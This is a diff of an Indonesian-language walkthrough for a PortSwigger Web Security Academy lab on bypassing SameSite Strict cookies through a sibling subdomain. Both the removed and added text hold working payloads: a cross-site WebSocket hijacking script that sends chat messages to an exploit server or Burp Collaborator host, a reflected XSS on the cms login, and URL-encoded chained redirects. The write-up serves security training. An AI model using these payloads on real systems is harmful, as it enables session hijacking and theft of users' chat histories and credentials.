@@ -19,228 +19,147 @@ Jika Anda belum melakukannya, kami menyarankan untuk menyelesaikan topik kami te
 ![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/1.png)
 
 ---------------------------------------------
+1.test chat dulu 
+2.cari endpoint /chat dan cari ini:
 
-Dari lab “Cross-site WebSocket Hijacking” yang telah diselesaikan di bagian WebSockets, kami memiliki payload berikut:
+https://0ab1001e04a27891802f1766000700f2.web-security-academy.net
+wss://0ab1001e04a27891802f1766000700f2.web-security-academy.net/chat
+https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net
 
-```html
+
+
+3.cari dihistory burpsuite /resources/js/chat.js ,jika tidak ada kirim request sendiri contoh:
+
+GET /resources/js/chat.js HTTP/2
+Host: 0ab1001e04a27891802f1766000700f2.web-security-academy.net
+Cookie: session=RInsjgHcRSwbqBvvzg3b6b6jF7mXNBgP
+Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ab1001e04a27891802f1766000700f2.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9,id;q=0.8
+Priority: u=0, i
+
+
+4.temukan coding yang yang menghandle messages yg dikirim dari server dan mengelola koneski:
+           let newWebSocket = new WebSocket(chatForm.getAttribute("action"));
+
+            newWebSocket.onopen = function (evt) {
+                writeMessage("system", "System:", "No chat history on record");
+                newWebSocket.send("READY");
+                res(newWebSocket);
+            }
+
+            newWebSocket.onmessage = function (evt) {
+                var message = evt.data;
+
+5.modifikasi codenya  menjadi seperrti ini:
+
 <script>
-    var ws = new WebSocket('wss://0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/chat');
-    ws.onopen = function() {
-        ws.send("READY");
-    };
-    ws.onmessage = function(event) {
-        fetch('https://if1w7siga1cezj30b8k08i20erki8bw0.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
-    };
+  let newWebSocket = new WebSocket("wss://0ab1001e04a27891802f1766000700f2.web-security-academy.net/chat");
+  
+  newWebSocket.onopen = function (evt) {
+    newWebSocket.send("READY");
+  };
+
+  newWebSocket.onmessage = function (evt) {
+    var message = evt.data;
+    fetch("https://exploit-0a1100b10456780a80081661016f0023.exploit-server.net/exploit?data=" + message);
+  };
 </script>
-```
 
-Ada sebuah koneksi:
+atau
+ 
+<script>
+  // Membuat koneksi WebSocket
+  let newWebSocket = new WebSocket("wss://0ab1001e04a27891802f1766000700f2.web-security-academy.net/chat");
 
-![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/2.png)
+  // Menangani event ketika WebSocket terbuka
+  newWebSocket.onopen = function (evt) {
+    console.log("WebSocket connection opened.");
+    newWebSocket.send("READY");
+  };
 
-Kami dapat membaca kode JavaScript untuk menulis komentar ke chat di `/resources/js/chat.js`:
+  // Menangani pesan yang diterima dari server
+  newWebSocket.onmessage = function (evt) {
+    let message = evt.data;
+    console.log("Message received:", message);
 
-![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/3.png)
-
-Dan bahwa karakter yang dienkode saat mengirim pesan adalah:
-
-```
-' " < > & \r \n \\
-```
-
-![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/4.png)
-![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/5.png)
-
-```javascript
-(function () {
-    var chatForm = document.getElementById("chatForm");
-    var messageBox = document.getElementById("message-box");
-    var webSocket = new WebSocket(chatForm.getAttribute("action"));
-
-    webSocket.onopen = function (evt) {
-        writeMessage("system", "System:", "No chat history on record")
-        webSocket.send("READY")
-    }
-
-    webSocket.onmessage = function (evt) {
-        var message = evt.data;
-
-        if (message === "TYPING") {
-            writeMessage("typing", "", "[typing...]")
+    // Mengirim data ke server eksternal menggunakan fetch
+    fetch("https://exploit-0a1100b10456780a80081661016f0023.exploit-server.net/exploit?data=" + encodeURIComponent(message))
+      .then(response => {
+        if (!response.ok) {
+          console.error("Failed to send data to exploit server:", response.statusText);
         } else {
-            var messageJson = JSON.parse(message);
-            if (messageJson && messageJson['user'] !== "CONNECTED") {
-                Array.from(document.getElementsByClassName("system")).forEach(function (element) {
-                    element.parentNode.removeChild(element);
-                });
-            }
-            Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
-                element.parentNode.removeChild(element);
-            });
-
-            if (messageJson['user'] && messageJson['content']) {
-                writeMessage("message", messageJson['user'] + ":", messageJson['content'])
-            }
+          console.log("Data sent successfully to exploit server.");
         }
-    };
+      })
+      .catch(error => {
+        console.error("Error occurred while sending data:", error);
+      });
+  };
 
-    webSocket.onclose = function (evt) {
-        writeMessage("message", "DISCONNECTED:", "-- Chat has ended --")
-    };
+  // Menangani event error WebSocket
+  newWebSocket.onerror = function (evt) {
+    console.error("WebSocket error occurred:", evt);
+  };
 
-    chatForm.addEventListener("submit", function (e) {
-        sendMessage(new FormData(this));
-        this.reset();
-        e.preventDefault();
-    });
-
-    function writeMessage(className, user, content) {
-        var row = document.createElement("tr");
-        row.className = className
-
-        var userCell = document.createElement("th");
-        var contentCell = document.createElement("td");
-        userCell.innerHTML = user;
-        contentCell.innerHTML = content;
-
-        row.appendChild(userCell);
-        row.appendChild(contentCell);
-        document.getElementById("chat-area").appendChild(row);
-    }
-
-    function sendMessage(data) {
-        var object = {};
-        data.forEach(function (value, key) {
-            object[key] = htmlEncode(value);
-        });
-
-        webSocket.send(JSON.stringify(object));
-    }
-
-    function htmlEncode(str) {
-        if (chatForm.getAttribute("encode")) {
-            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
-                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
-                return lookup[c];
-            });
-        }
-        return str;
-    }
-})();
-```
-
-Saat mengambil file ini, kami menemukan subdomain “cms” pada header HTTP “Access-Control-Allow-Origin” dalam respons:
-
-![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/6.png)
-
-Ada fungsi login di subdomain tersebut. Fungsi ini memantulkan username yang kami kirim:
-
-![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/7.png)
-
-Dengan menggunakan payload XSS pada field username, kami mendapatkan XSS:
-
-```
-<script>alert(1)</script>
-```
-
-![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/8.png)
-
-Ini adalah permintaan POST tetapi dapat diubah menjadi GET:
-
-![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/9.png)
-
-"Karena subdomain sibling ini adalah bagian dari situs yang sama, Anda dapat menggunakan XSS ini untuk meluncurkan serangan CSWSH tanpa dimitigasi oleh pembatasan SameSite"
-
-```html
-<script>
-    document.location = "https://cms-0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/login?username=aa&password=aa";
+  // Menangani event WebSocket ditutup
+  newWebSocket.onclose = function (evt) {
+    console.log("WebSocket connection closed:", evt);
+  };
 </script>
-```
 
-URL-encode payload “Cross-site WebSocket hijacking”:
 
-```
-%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%39%30%30%39%62%30%34%65%32%65%35%38%32%38%30%34%66%63%31%66%37%30%30%62%38%30%30%64%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%69%66%31%77%37%73%69%67%61%31%63%65%7a%6a%33%30%62%38%6b%30%38%69%32%30%65%72%6b%69%38%62%77%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
-```
+6.buka exploit dan kirim code tersebut ke victim dan lihat hasilnya:
+![image](https://github.com/user-attachments/assets/1126c6bc-537a-43aa-880d-d68171b6be2c)
 
-Gunakan ini sebagai payload di field username:
+![image](https://github.com/user-attachments/assets/21d7d3c3-eb62-40ce-a028-377a97087a45)
 
-```
+7.kita lanjut ke tahap selanjutnya dengan mengexplore url ini:
+https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net
+![image](https://github.com/user-attachments/assets/1224fd68-3c9c-402c-8c19-da359217aa79)
+
+![image](https://github.com/user-attachments/assets/4c05d559-3098-4778-b7c2-476136959526)
+
+bisa kita lihat diatas jika kita memasukkan user dan password maka akann ditampilkan dihalaman depan,kemungkinan besar terdapat kerentanan xss
+![image](https://github.com/user-attachments/assets/8de18b1e-be92-493b-ad2d-a33dc0c4eaa0)
+![image](https://github.com/user-attachments/assets/d9c6197c-17ca-4df8-8460-ef8cce8cca1b)
+
+7.cari url ini dibupsuite lalu kirim ke reapter :https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net/login
+![image](https://github.com/user-attachments/assets/0f11b05e-d983-451e-a09c-289bae0127b8)
+
+8.lalu ubah ke method get,lalu encode code pada tahap ke 5 menjadi url dan gabungkan dengan url tersebut:
+
+![image](https://github.com/user-attachments/assets/1fe7a1c4-463d-4da3-8816-18842dd598ff)
+
+https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%62%31%30%30%31%65%30%34%61%32%37%38%39%31%38%30%32%66%31%37%36%36%30%30%30%37%30%30%66%32%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%20%20%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%7d%3b%0a%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%31%31%30%30%62%31%30%34%35%36%37%38%30%61%38%30%30%38%31%36%36%31%30%31%36%66%30%30%32%33%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%64%61%74%61%3d%22%20%2b%20%6d%65%73%73%61%67%65%29%3b%0a%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=ddadad
+
 <script>
-    document.location = "https://cms-0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%39%30%30%39%62%30%34%65%32%65%35%38%32%38%30%34%66%63%31%66%37%30%30%62%38%30%30%64%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%69%66%31%77%37%73%69%67%61%31%63%65%7a%6a%33%30%62%38%6b%30%38%69%32%30%65%72%6b%69%38%62%77%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=aa";
+  let newWebSocket = new WebSocket("wss://0ab1001e04a27891802f1766000700f2.web-security-academy.net/chat");
+  
+  newWebSocket.onopen = function (evt) {
+    newWebSocket.send("READY");
+  };
+
+  newWebSocket.onmessage = function (evt) {
+    var message = evt.data;
+    fetch("https://exploit-0a1100b10456780a80081661016f0023.exploit-server.net/exploit?data=" + message);
+  };
 </script>
-```
 
-![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/10.png)
 
-Masuk dengan kredensial `carlos:565vmsewc7e8c05o7jf4`
+9.lalu ubah jadi sperti ini :
+<script>
+document.location = "https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%62%31%30%30%31%65%30%34%61%32%37%38%39%31%38%30%32%66%31%37%36%36%30%30%30%37%30%30%66%32%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%20%20%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%7d%3b%0a%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%31%31%30%30%62%31%30%34%35%36%37%38%30%61%38%30%30%38%31%36%36%31%30%31%36%66%30%30%32%33%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%64%61%74%61%3d%22%20%2b%20%6d%65%73%73%61%67%65%29%3b%0a%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=ddadad"
+</script>
 
-## Penjelasan
-
-### Apa Itu CSWSH?
-
-Cross-Site WebSocket Hijacking (CSWSH) adalah jenis serangan di mana penyerang mengeksploitasi koneksi WebSocket yang ada antara pengguna dan server untuk mengirim atau menerima data yang tidak diinginkan. Ini memungkinkan penyerang untuk melakukan tindakan seolah-olah mereka adalah pengguna yang sah.
-
-### Apa Itu SameSite dan Bagaimana Pengaruhnya?
-
-SameSite adalah atribut pada cookie yang mengontrol apakah cookie tersebut akan dikirim bersama dengan permintaan lintas situs (cross-site). Ada tiga opsi utama:
-
-1. **Strict:** Cookie hanya dikirim jika permintaan berasal dari situs yang sama.
-2. **Lax:** Cookie dikirim dengan permintaan GET lintas situs, seperti saat pengguna mengklik tautan.
-3. **None:** Cookie dikirim dengan semua jenis permintaan lintas situs, tetapi harus aman (secure).
-
-Dalam kasus ini, Chrome menggunakan pembatasan **SameSite Strict** secara default, yang berarti cookie hanya dikirim jika permintaan berasal dari situs yang sama, sehingga mencegah pengiriman cookie pada permintaan lintas situs apapun.
-
-### Bagaimana Bypass SameSite Strict Melalui Domain Sibling Bekerja?
-
-Meskipun SameSite Strict mencegah pengiriman cookie pada permintaan lintas situs, teknik **domain sibling** memungkinkan penyerang untuk memanfaatkan kerentanan dalam logika pengalihan aplikasi untuk mengeksekusi permintaan yang diinginkan.
-
-Dalam contoh ini:
-
-1. **Pengaturan Awal:** Pengguna terautentikasi di situs target, dan cookie dengan atribut `SameSite=Strict` disimpan di browser.
-2. **Subdomain Sibling:** Terdapat subdomain `cms` yang berada dalam domain yang sama dan memiliki kebijakan `Access-Control-Allow-Origin` yang memungkinkan akses dari domain utama.
-3. **Fungsi Login yang Rentan:** Fungsi login di subdomain `cms` memantulkan username yang dikirim tanpa sanitasi yang tepat, memungkinkan penyisipan skrip (XSS).
-4. **Eksploitasi XSS untuk CSWSH:** Dengan menyisipkan payload XSS melalui field username, penyerang dapat menjalankan skrip yang membuka koneksi WebSocket dan mengirim data ke server penyerang.
-5. **Pengiriman Data Sensitif:** Skrip yang disisipkan akan membuka koneksi WebSocket ke server penyerang dan mengirimkan data yang diterima, termasuk riwayat chat yang berisi kredensial login korban.
-
-### Langkah-Langkah Serangan
-
-1. **Menyiapkan Halaman Exploit:** Penyerang membuat halaman HTML yang berisi skrip yang memanfaatkan kerentanan XSS pada subdomain `cms` untuk menjalankan payload CSWSH.
-   
-2. **Memanfaatkan XSS melalui Username:** Dengan mengubah field username menjadi payload XSS yang di-URL encode, penyerang dapat menyisipkan skrip yang membuka koneksi WebSocket dan mengirim data ke server mereka.
-
-3. **Membuka Koneksi WebSocket:** Skrip yang disisipkan akan membuka koneksi WebSocket ke endpoint chat yang rentan dan mengirimkan pesan "READY" untuk memulai sesi.
-
-4. **Mengirimkan Data ke Server Penyerang:** Setiap kali pesan diterima melalui WebSocket, skrip akan mengirimkan data tersebut ke server Burp Collaborator atau server penyerang lainnya menggunakan permintaan `fetch`.
-
-5. **Mengambil Riwayat Chat dan Kredensial:** Data yang dikirimkan mencakup riwayat chat yang berisi kredensial login korban dalam teks biasa, memungkinkan penyerang untuk mengakses akun korban.
-
-### Mengapa Kerentanan Ini Terjadi?
-
-Kerentanan ini terjadi karena:
-
-- **Validasi Input yang Lemah:** Aplikasi tidak memvalidasi atau menyaring input yang diterima melalui field username dengan benar, memungkinkan penyisipan skrip berbahaya (XSS).
-
-- **Penggunaan Subdomain Sibling:** Subdomain `cms` berada dalam domain yang sama, sehingga kebijakan SameSite tidak mencegah pengiriman cookie pada permintaan yang berasal dari subdomain tersebut.
-
-- **Kebijakan CORS yang Longgar:** Header `Access-Control-Allow-Origin` yang mengizinkan akses dari domain utama memungkinkan skrip di subdomain untuk melakukan permintaan lintas situs tanpa pembatasan yang ketat.
-
-- **Kurangnya Mekanisme Perlindungan pada WebSocket:** Endpoint WebSocket tidak menerapkan mekanisme validasi tambahan atau autentikasi yang kuat untuk memastikan bahwa koneksi berasal dari sumber yang sah.
-
-## Kesimpulan
-
-Untuk mencegah kerentanan CSWSH seperti ini, penting untuk:
-
-- **Memvalidasi dan Menyaring Input dengan Ketat:** Pastikan bahwa semua input yang diterima oleh aplikasi, terutama yang digunakan dalam konteks yang sensitif seperti field username, disaring dan divalidasi untuk mencegah penyisipan skrip berbahaya.
-
-- **Menggunakan Atribut SameSite dengan Tepat:** Pertimbangkan penggunaan `SameSite=Strict` secara konsisten pada semua cookie, termasuk yang digunakan oleh subdomain, untuk mencegah pengiriman cookie pada permintaan lintas situs.
-
-- **Menerapkan Kebijakan CORS yang Ketat:** Batasi asal yang diizinkan untuk mengakses sumber daya melalui kebijakan CORS yang lebih ketat, memastikan bahwa hanya domain yang sah yang dapat melakukan permintaan lintas situs.
-
-- **Mengamankan Endpoint WebSocket:** Implementasikan mekanisme autentikasi dan validasi yang kuat pada endpoint WebSocket untuk memastikan bahwa hanya koneksi yang sah yang dapat mengakses dan mengirim data.
-
-- **Menggunakan Atribut Secure dan HttpOnly pada Cookie:** Ini membantu mencegah akses tidak sah ke cookie dari sisi klien dan mengurangi risiko serangan XSS yang dapat mencuri token CSRF atau kredensial lainnya.
-
-- **Menerapkan Content Security Policy (CSP):** CSP dapat membantu mencegah eksekusi skrip yang tidak diinginkan dan mengurangi risiko serangan XSS.
-
-Dengan menerapkan langkah-langkah ini, aplikasi web dapat lebih efektif dalam melindungi diri dari serangan CSWSH dan memastikan bahwa tindakan sensitif hanya dapat dilakukan oleh pengguna yang sah.
+![image](https://github.com/user-attachments/assets/ad500fe0-106d-4f14-a30e-92c00d87e73a)
